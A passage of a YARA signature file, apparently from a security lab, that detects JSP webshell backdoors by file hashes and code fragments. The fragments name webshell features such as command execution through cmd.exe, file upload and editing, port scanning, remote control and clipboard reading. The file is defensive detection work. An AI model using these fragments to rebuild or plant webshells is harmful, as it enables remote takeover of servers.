        $s5 = "sbCopy.append(\"<input type=hidden name=file value='\" + strFile" fullword ascii
        $s6 = "if (!f1.renameTo(new File(path + f1.getName()))) {" fullword ascii
        $s7 = "private synchronized String getLine(ServletInputStream sis)" fullword ascii
        $s8 = "strAfterComma = \"\" + 100 * (filesize % intDivisor) / intDivisor;" fullword ascii
        $s9 = "if (ht.get(\"cqqUploadFile\") != null) {" fullword ascii
        $s10 = "sbCopy.append(\"<input type=hidden name=path value='\" + strDir" fullword ascii
        $s11 = "sbCmd.append(line + \"\\r\\n\");" fullword ascii
        $s12 = "<TEXTAREA NAME=\"cqq\" ROWS=\"20\" COLS=\"100%\"><%=sbCmd.toString()%></TEXTAREA>" fullword ascii
        $s13 = ".append(\"<form name='frmEdit' action='' method='POST'>\\r\\n\");" fullword ascii
        $s14 = ".append(\"<br><form name='frmCopy' action='' method='POST'>\\r\\n\");" fullword ascii
        $s15 = "line = line.substring(0, index - 1);" fullword ascii
        $s16 = "sbEdit.append(htmlEncode(line) + \"\\r\\n\");" fullword ascii
        $s17 = "sb.append(roots[i] + \"</a>&nbsp;\");" fullword ascii
        $s18 = "String strDesFile = request.getParameter(\"file2\");" fullword ascii
        $s19 = "String strF = request.getParameter(\"fileName\");" fullword ascii
        $s20 = "while ((c = in1.read(buffer)) != -1) {" fullword ascii
    condition:
        ( ( uint16(0) == 0x3c0a or uint16(0) == 0x253c ) and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _3870b31f26975a7cb424eab6521fc9bffc2af580_94d1aaabde8ff9b4b8f394dc68caebf981c86587_23
{
    meta:
        description = "jsp - from files 3870b31f26975a7cb424eab6521fc9bffc2af580.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8c363b86ed9622b529f7b7e3bd10e05c30738dee595038400cdab9cd9033bad6"
        hash2 = "706862017d0b10e466f2933bb703e75b420e6e94b558ae64679954fc3f900c1b"
    strings:
        $x1 = "System.out.println(\"getHostPort:\"+task);" fullword ascii
        $s2 = "System.out.println(\"getHtmlContext:\" + e.getMessage());" fullword ascii
        $s3 = "System.out.println(\"getCss:\" + e.getMessage());" fullword ascii
        $s4 = "System.out.println(\"getHtmlContext2:\" + e.getMessage());" fullword ascii
        $s5 = "String scantarget = useIp + i + \":\" + port[j];" fullword ascii
        $s6 = "System.out.println(\"end:\" + end);" fullword ascii
        $s7 = "System.out.println(\"start:\" + start);" fullword ascii
        $s8 = "String reaplce = \"href=\\\"http://127.0.0.1:8080/Jwebinfo/out.jsp?url=\";" fullword ascii
        $s9 = "String getHtmlContext(HttpURLConnection conn, String decode,boolean isError) {" fullword ascii
        $s10 = "String s = application.getRealPath(\"/\") + \"/port.txt\";" fullword ascii
        $s11 = "FileUtils.writeStringToFile(new File(cpath+\"/port.txt\"), s,\"UTF-8\",true);" fullword ascii
        $s12 = "<textarea name=\"post\" cols=40 rows=4>username=admin&password=admin</textarea>" fullword ascii
        $s13 = "//System.out.println(scantarget);" fullword ascii
        $s14 = "+ getHtmlContext(getHTTPConn(cssuuu), decode,false)" fullword ascii
        $s15 = "<textarea name=\"post\" cols=40 rows=4>SESSION:d89de9c2b4e2395ee786f1185df21f2c51438059222</textarea>" fullword ascii
        $s16 = "Referer:<input name=\"referer\" value=\"http://www.baidu.com\"" fullword ascii
        $s17 = "System.out.print(e.getLocalizedMessage());" fullword ascii
        $s18 = "System.out.print(e.getMessage());" fullword ascii
        $s19 = "System.out.print(\"Count1:\" + queue.size());" fullword ascii
        $s20 = "document.getElementById(\"port\").style.display = \"block\";" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _03b48a3173a919b51278f38a88b7ef5aca4f7d59_19e30ccd0c4695c76a8d02259a446f109df6ba24_2f7b4343c3b3387546d5ce5815048992beab4645__24
{
    meta:
        description = "jsp - from files 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
        hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
        hash3 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
        hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
        hash5 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
        hash6 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
        hash7 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
        hash8 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
        hash9 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
        hash10 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
        hash11 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
        hash12 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
        hash13 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
        hash14 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
        hash15 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
        hash16 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
        hash17 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
        hash18 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
        hash19 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
        hash20 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $x1 = "Hashtable ht = parser.processData(request.getInputStream(), bound, tempdir, clength);" fullword ascii
        $s2 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
        $s3 = "sbFolder.append(strParentFolder[languageNo]+\"</a><br>- - - - - - - - - - - </td></tr>\\r\\n \");" fullword ascii
        $s4 = "response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
        $s5 = "if((request.getContentType()!= null) && (request.getContentType().toLowerCase().startsWith(\"multipart\")))" fullword ascii
        $s6 = "sbCopy.append(\"<br><form name='frmCopy' action='' method='POST'>\\r\\n\");" fullword ascii
        $s7 = "<form name=\"frmUpload\" enctype=\"multipart/form-data\" action=\"\" method=\"post\">" fullword ascii
        $s8 = "String strContent=request.getParameter(\"content\");" fullword ascii
        $s9 = "sbEdit.append(\"<form name='frmEdit' action='' method='POST'>\\r\\n\");" fullword ascii
        $s10 = "<li><a href=\"new.htm\" onClick=\"return expandcontent('menu2', this)\" theme=\"#EAEAFF\"> <%=strCommand[languageNo]%> </a></li>" ascii
        $s11 = "StringBuffer sb=new StringBuffer(strDrivers[languageNo] + \" : \");" fullword ascii
        $s12 = "if (!f1.renameTo(new File(path + f1.getName()))) " fullword ascii
        $s13 = "strAfterComma = \"\" + 100 * (filesize % intDivisor) / intDivisor ;" fullword ascii
        $s14 = "sbFolder.append(list[i].getName()+\"</a><br></td></tr> \");" fullword ascii
        $s15 = "sbEdit.append(\"<br><textarea rows=30 cols=90 name=content>\");" fullword ascii
        $s16 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('down','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s17 = "sbFile.append(\"  &nbsp;<a href=\\\"javascript:doForm('copy','\"+formatPath(strDir)+\"','\"+list[i].getName()+\"','\"+strCmd+\"'" ascii
        $s18 = "sbFolder.append(\"  <a href=\\\"javascript:doForm('','\"+formatPath(list[i].getAbsolutePath())+\"','','\"+strCmd+\"','1','');" ascii
        $s19 = "FileInputStream fileInputStream =new FileInputStream(f.getAbsolutePath());" fullword ascii
        $s20 = "if (ht.get(\"cqqUploadFile\") != null)" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 90KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _889c4d2a173c673e62ceb3f612494a2e99c56bc7_8df56930f13d77c5886e34ca6511c12ae6660d9a_9e32b877_e01d_4948_80e9_8e65151ca2b6_bdae_25
{
    meta:
        description = "jsp - from files 889c4d2a173c673e62ceb3f612494a2e99c56bc7.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "e44e97f8d375523576bb2e93e3de8d29d7f95891da3d082bf083b837d1873eab"
        hash2 = "62c616f5cddfd493f16e6ef2d7fe12567ee2d16a311317da8d59fb5f3f09f713"
        hash3 = "115d2750f70a1cc6cda5aa72bd8541bba87157c6f00dc7f311f3f5ba1bb41ecb"
        hash4 = "5c8e4945b0aa4bc661db0f9fea51a7fac07ad3d4093c499100570a613906512c"
        hash5 = "b5e9cd17caf4344895afca031a55535af49189c60a4b05095425931c9ab1b11b"
        hash6 = "89a69d8d77e3a427276a568cde58dbfa0fd8a555f51ecc38c1b91a929db2b209"
    strings:
        $s1 = "response.setHeader(\"Expires\", sdf.format(new Date(now.getTime() + 1000 * 60 * 60 * 24*2)));" fullword ascii
        $s2 = "response.setHeader(\"Content-Type\", \"text/javascript\");" fullword ascii
        $s3 = "*If true, all operations (besides upload and native commands) " fullword ascii
        $s4 = "if (request.getAttribute(\"olddir\") != null && isAllowed(new File((String) request.getAttribute(\"olddir\")), false)) {" fullword ascii
        $s5 = "Command: <input size=\"<%=EDITFIELD_COLS-5%>\" type=\"text\" name=\"command\" value=\"\">" fullword ascii
        $s6 = "<tr><td title=\"Enter the new filename\"><input type=\"text\" name=\"new_name\" value=\"<%=ef.getName()%>\">" fullword ascii
        $s7 = "private static final String SAVE_AS_ZIP = \"Download selected files as (z)ip\";" fullword ascii
        $s8 = "private static final String LAUNCH_COMMAND = \"(L)aunch external program\";" fullword ascii
        $s9 = "<h2>Content of <%=conv2Html(f.getName())%></h2><br />" fullword ascii
        $s10 = "out.print (\"<td>\" + elink + \"</td>\"); // The edit link (or view, depending)" fullword ascii
        $s11 = "request.setAttribute(\"error\", \"Upload is forbidden!\");" fullword ascii
        $s12 = "if (!isAllowed(new File((String)ht.get(\"dir\")), false)){" fullword ascii
        $s13 = "dlink + \"</td>\"); // The download link" fullword ascii
        $s14 = "out.println(\"<td align=center><input type=\\\"checkbox\\\" name=\\\"selfile\\\" disabled></td>\");" fullword ascii
        $s15 = "if (isAllowed(f, false)) request.setAttribute(\"dir\", f.getAbsolutePath());" fullword ascii
        $s16 = "if (!isAllowed(new File((String)request.getAttribute(\"dir\")), false)){" fullword ascii
        $s17 = "if (request.getParameter(\"Javascript\") != null) {" fullword ascii
        $s18 = "if (f.getParent() != null && isAllowed(f, false)) f = new File(f.getParent());" fullword ascii
        $s19 = "<form class=\"formular2\" action=\"<%= browser_name%>\" enctype=\"multipart/form-data\" method=\"POST\">" fullword ascii
        $s20 = "<tr><td colspan=\"2\"><input type=\"radio\" name=\"lineformat\" value=\"dos\" <%= dos?\"checked\":\"\"%>>Ms-Dos/Windows" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0x3c0a ) and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule _0317bd1d741350d9bc4adbf92801b6a109a57458_032c141019ceabee44e013e27d7e77bc4995125a_117eb7a7743d53e767129befd5d2458d1621b23b__26
{
    meta:
        description = "jsp - from files 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
        hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
        hash3 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
        hash4 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
        hash5 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
        hash6 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
        hash7 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
        hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
        hash9 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash10 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
        hash11 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
        hash12 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
        hash13 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash14 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
        hash15 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash16 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
        hash17 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
        hash18 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
        hash19 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
        hash20 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
        hash21 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
        hash22 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
        hash23 = "20439a4058bb68ba1973e780a51942a19e775f665ea241d8d667afe4f2c49b1a"
        hash24 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
        hash25 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
        hash26 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
        hash27 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash28 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
        hash29 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
        hash30 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash31 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash32 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash33 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
        hash34 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
        hash35 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
        hash36 = "efe0746ae5723f3b9e4d83bbe5f65a1526ea9b42abc85883afb67e64a3697129"
        hash37 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
        hash38 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
        hash39 = "b9e52d41fa9d41dfaebad793ef99bda10c1f1c08fca43541b6d83c0e23cabddd"
        hash40 = "7fff522245c07cf0dc1a00f2650ff37b948337de5d93f58dca8825cea2de0442"
        hash41 = "74168264a53223da64ade79b2083bfaf214fcf3d4a2853d74697d42af78165d0"
        hash42 = "c8b7d196856c0c5c0f4d6e6a0300f77dab19d5479bde6a757510af1ec410df6f"
    strings:
        $x1 = "if (program == null) program = \"cmd.exe /c net start > \"+SHELL_DIR+\"/Log.txt\";" fullword ascii
        $x2 = "if (cmd == null) cmd = \"cmd.exe /c set\";" fullword ascii
        $s3 = "ins.get(\"vLogin\").invoke(request,response,session);" fullword ascii
        $s4 = "ins.get(\"login\").invoke(request,response,session);" fullword ascii
        $s5 = "<input type=\\\"text\\\" name=\\\"exe\\\" style=\\\"width:300px\\\" class=\\\"input\\\" value=\\\"c:\\\\windows\\\\system32\\\\c" ascii
        $s6 = "out.println(Util.htmlEncode(Util.getStr(Toolkit.getDefaultToolkit().getSystemClipboard().getData(DataFlavor.stringFlavor))));" fullword ascii
        $s7 = "ins.get(\"vPortScan\").invoke(request,response,JSession);" fullword ascii
        $s8 = "ins.get(\"script\").invoke(request,response,session);" fullword ascii
        $s9 = "response.sendRedirect(SHELL_NAME+\"?o=vLogin\");" fullword ascii
        $s10 = "\"  <input type=\\\"checkbox\\\" \"+execute+\" name=\\\"execute\\\" id=\\\"checkbox3\\\">\"+" fullword ascii
        $s11 = "ins.get(\"filelist\").invoke(request,response,JSession);" fullword ascii
        $s12 = "ins.get(\"vs\").invoke(request,response,JSession);" fullword ascii
        $s13 = "ins.get(\"vd\").invoke(request,response,JSession);" fullword ascii
        $s14 = "ins.get(\"vmp\").invoke(request,response,JSession);" fullword ascii
        $s15 = "ins.put(\"vRemoteControl\",new VRemoteControlInvoker());" fullword ascii
        $s16 = "ins.get(\"bottom\").invoke(request,response,session);" fullword ascii
        $s17 = "ins.get(\"top\").invoke(request,response,session);" fullword ascii
        $s18 = "ins.get(\"dbc\").invoke(request,response,JSession);" fullword ascii
        $s19 = "ins.get(\"after\").invoke(request,response,session);" fullword ascii
        $s20 = "ins.get(\"before\").invoke(request,response,session);" fullword ascii
    condition:
        ( ( uint16(0) == 0xbbef or uint16(0) == 0x253c or uint16(0) == 0x6f43 ) and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule _3870b31f26975a7cb424eab6521fc9bffc2af580_52bfc305a6e7e5daa318d664ecfdc19986fa5f4e_94d1aaabde8ff9b4b8f394dc68caebf981c86587_27
{
    meta:
        description = "jsp - from files 3870b31f26975a7cb424eab6521fc9bffc2af580.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8c363b86ed9622b529f7b7e3bd10e05c30738dee595038400cdab9cd9033bad6"
        hash2 = "90585b989fb9e487a803da82d671baca0cf88bfc977fc54ad1d31c19ed48e18b"
        hash3 = "706862017d0b10e466f2933bb703e75b420e6e94b558ae64679954fc3f900c1b"
    strings:
        $s1 = "conn.addRequestProperty(\"User-Agent\"," fullword ascii
        $s2 = "java.net.HttpURLConnection conn = (java.net.HttpURLConnection) url" fullword ascii
        $s3 = "String cssuuu = url + \"/\" + cssurl.get(i);" fullword ascii
        $s4 = "HttpURLConnection getHTTPConn(String urlString) {" fullword ascii
        $s5 = "HttpURLConnection conn = getHTTPConn(addr);" fullword ascii
        $s6 = "String getServerType(HttpURLConnection conn) {" fullword ascii
        $s7 = "\"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Maxthon;)\");" fullword ascii
        $s8 = "return ia.getHostAddress();" fullword ascii
        $s9 = "while ((temp = br.readLine()) != null) {" fullword ascii
        $s10 = "title = title + list.get(i);" fullword ascii
        $s11 = "InetAddress ia = InetAddress.getLocalHost();" fullword ascii
        $s12 = "cssurl.add(ma.group(1) + \".css\");" fullword ascii
        $s13 = "String threadpp = (request.getParameter(\"thread\"));" fullword ascii
        $s14 = "<%@page import=\"java.net.HttpURLConnection\"%>" fullword ascii
        $s15 = "html.append(temp).append(\"\\n\");" fullword ascii
        $s16 = "List<String> getCss(String html, String url, String decode) {" fullword ascii
        $s17 = "Pattern pa = Pattern.compile(\".*href=\\\"(.*)[.]css\");" fullword ascii
        $s18 = "String cook = request.getParameter(\"cookie\");" fullword ascii
        $s19 = "Pattern pa = Pattern.compile(\"<title>.*?</title>\");" fullword ascii
        $s20 = "System.out.println(threadpp);" fullword ascii
    condition:
        ( uint16(0) == 0x253c and filesize < 50KB and ( 8 of them ) ) or ( all of them )
}

rule _03b48a3173a919b51278f38a88b7ef5aca4f7d59_19e30ccd0c4695c76a8d02259a446f109df6ba24_2f7b4343c3b3387546d5ce5815048992beab4645__28
{
    meta:
        description = "jsp - from files 03b48a3173a919b51278f38a88b7ef5aca4f7d59.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "2b9e91c45df8a47f2467687ea4991bf472a4de5a9cc385607fe93b7d65a190b0"
        hash2 = "4b4fe0aa707377467c8902275cc8b0bca9a1bb82c2ee143f2a66740c6ee7b1a9"
        hash3 = "2b6e0dd793daf6b163dcd0cd46e5dc80c7b7538129fa36a9cb77c348a37eb9ae"
        hash4 = "d0b0f9eace0b5f380e3349de69be4580c579c21f3ba6d25d21dc16627e0f18e4"
        hash5 = "956fd75fa839357ecf2a661d7d2e569b93f2ee1b384db1f31dbd9d8a6c4848fe"
        hash6 = "23c6ec0fa69a46fadc013bb6a8aadbd5fe98e1146eb9da448dc03ece5fc564a0"
        hash7 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
        hash8 = "d68309110a26e6a2e68243f5c741ec48f31ead236fa726d0fee1fa656e3bdff8"
        hash9 = "48f3946cc7f803765ab49085af9f021ed4aa3b80a6b1644ad913f2b7fced1ec8"
        hash10 = "4f3536e62fdc916732477c7af65f1549d65afc7fcf7a0e723f02bf17cb5f2a88"
        hash11 = "4a2e30384b406fcae72571881aef4f7b78a9f7a918d583683f0c1f05e745400a"
        hash12 = "74a40d1f616e3843e5b5c6e4c26b6d1afe387ae4cf7e9778f476ed483587a09a"
        hash13 = "35a32cae9b51b97136f3458635ea31e70f9ad8244e58252e96d32cc2985ab139"
        hash14 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
        hash15 = "8a32fa3ed14e8fa7e4139e258c7a65ff4fbc3ddb8bc0e0129059c8bdd542e228"
        hash16 = "f84187222d55b12ae1c0dbf8915bcd5a80b066b351113b67371e6f9433da5b20"
        hash17 = "5a941c7049d80e6ef7ff9ac7ad9a910bbf7677daba73a6409bc59f62b2e22a89"
        hash18 = "91f4ee44392649bcb043b8d9db2ed42186934e065dc31241c8da7076c6e9e575"
        hash19 = "3e4413d2aa81b756f09f9eb472e742c7d2062f39e27a8d29a25a80ebab09b64a"
        hash20 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
        hash21 = "d5756abb572705bf4375b1a80961d72194a8193f81c77938a598139f9ec13c1c"
        hash22 = "fac57539ea8ccf3c4130fc5acf2134e4ffa51e25f862bcaaf28b76454b236c37"
        hash23 = "7f9280722b4cace28d9abad207c037e723a4e81264de262ab4f537037c10f733"
        hash24 = "7fa62fd590580a8962f83e43e1d33d47dda9ab1a8876ef67fef86cf474594fea"
    strings:
        $s1 = "aobject.style.backgroundColor=document.getElementById(\"tabcontentcontainer\").style.backgroundColor=themecolor" fullword ascii
        $s2 = "return filesize / intDivisor + \".\" + strAfterComma + \" \" + strUnit;" fullword ascii
        $s3 = "var themecolor=aobject.getAttribute(\"theme\")? aobject.getAttribute(\"theme\") : initTabpostcolor" fullword ascii
        $s4 = "FileInfo fi = (FileInfo) ht.get(\"cqqUploadFile\");" fullword ascii
        $s5 = "function doForm(action,path,file,cmd,tab,content)" fullword ascii
        $s6 = "String strCmd = request.getParameter(\"cmd\");" fullword ascii
        $s7 = "<form name=\"cmd\" action=\"\" method=\"post\">" fullword ascii
        $s8 = "document.getElementById(previoustab).style.display=\"none\"" fullword ascii
        $s9 = "document.frmCqq.cmd.value=cmd;" fullword ascii
        $s10 = "document.getElementById(cid).style.display=\"block\"" fullword ascii
        $s11 = "var elstyle=window.getComputedStyle(el, \"\")" fullword ascii
        $s12 = "String path = (String) ht.get(\"path\");" fullword ascii
        $s13 = "initTabpostcolor=cascadedstyle(tabobjlinks[0], \"backgroundColor\", \"background-color\")" fullword ascii
        $s14 = "else if (window.getComputedStyle){" fullword ascii
        $s15 = "window.addEventListener(\"load\", do_onload, false)" fullword ascii
        $s16 = "document.frmCqq.content.value=content;" fullword ascii
        $s17 = "expandcontent(initialtab[1], tabobjlinks[initialtab[0]-1])" fullword ascii
        $s18 = "<input type=\"hidden\" name=\"cmd\" value=\"<%=strCmd%>\">" fullword ascii
        $s19 = "String strFile = request.getParameter(\"file\");" fullword ascii
        $s20 = "String strAction = request.getParameter(\"action\");" fullword ascii
    condition:
        ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef or uint16(0) == 0x3c0a ) and filesize < 100KB and ( 8 of them ) ) or ( all of them )
}

rule _0317bd1d741350d9bc4adbf92801b6a109a57458_032c141019ceabee44e013e27d7e77bc4995125a_0d4b369f7cba724aaa4962caf463c5cfb915a141__29
{
    meta:
        description = "jsp - from files 0317bd1d741350d9bc4adbf92801b6a109a57458.jsp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
        hash2 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
        hash3 = "8f3cbb8d25d2371f2366f0cfbba3cb1e86dff7f5df90278be186abfc03d930be"
        hash4 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
        hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
        hash6 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
        hash7 = "e68119870bc45d5cfda0a196d909288a48dc9ba4182596bfcc61939f79e47e7d"
        hash8 = "187900f5969d51b1e97b8fc86f285d903897663198aa50ce4bccb2d66f3058c8"
        hash9 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
        hash10 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
        hash11 = "3d192c949b8ae3da720884c66c19358246b46e38798bec40a1ad94da65a9034d"
        hash12 = "f91f6009cfee1189db44edcba85b2d9bad819331ee4e369cdcb4e21710c6768c"
        hash13 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
        hash14 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
        hash15 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
        hash16 = "09313b0c7b353d392366b5790476ba61a2b7edba8658c47870845387bf2505db"
        hash17 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
        hash18 = "4dc5f8054f0fff649e263b1eb7e82b30bd71fdea7d1d2b4c6299cb329029ac50"
        hash19 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
        hash20 = "04ceac0d310cde0e605e38d0e8b841d6f801b57cc6fef5ef7b792612db9acea8"
        hash21 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
        hash22 = "c13a5ec3d790bd79fd182c877b03092f4a80d9de9ea7487444a39b1dd52fc7e1"
        hash23 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
        hash24 = "7806a1b185b2dbb935880050d90ffdc502d5e6ac2b80950bced653f7e506aa00"
        hash25 = "50f7ee552bcb9706aedfdb3219dc340c9a6b3c451d0898b9d4c2ab1ffc14efb1"
        hash26 = "9f3b666adc648f9ef129f2862b3d88e1c0f05bd04577df0af59b23adae302406"
        hash27 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
        hash28 = "e2daa70b1cbb80911d9c2f48bb527ef64ef55995938cb12beb820e890dd30240"
        hash29 = "84588230bd7d4dbfd3c3544c54e31a0348c614b6c9ad2fd78334cc04dbf16164"
        hash30 = "8aa5dca21b414254d8f772487dd8569b0753813535b3ce1430609f9e52f3fe4c"
        hash31 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
        hash32 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
        hash33 = "9907c1f10ca7ddde1c8f9a652506737b86e60eb8b537c8a42d4fad55e199d3a7"
        hash34 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
        hash35 = "6772b3f0fcf087e3cd64979b34a547897bbd199b314a41d1478ad400314cd0d2"
        hash36 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
        hash37 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
        hash38 = "ef63eb867061b4b442ec4dc81fe92db3f716da56b82ba14895979c3c0be569a6"
        hash39 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
        hash40 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
        hash41 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
        hash42 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
        hash43 = "19375141be573a9a01da3eeb26735ecdf7b7beafdbedbd8a0289e42bda552696"
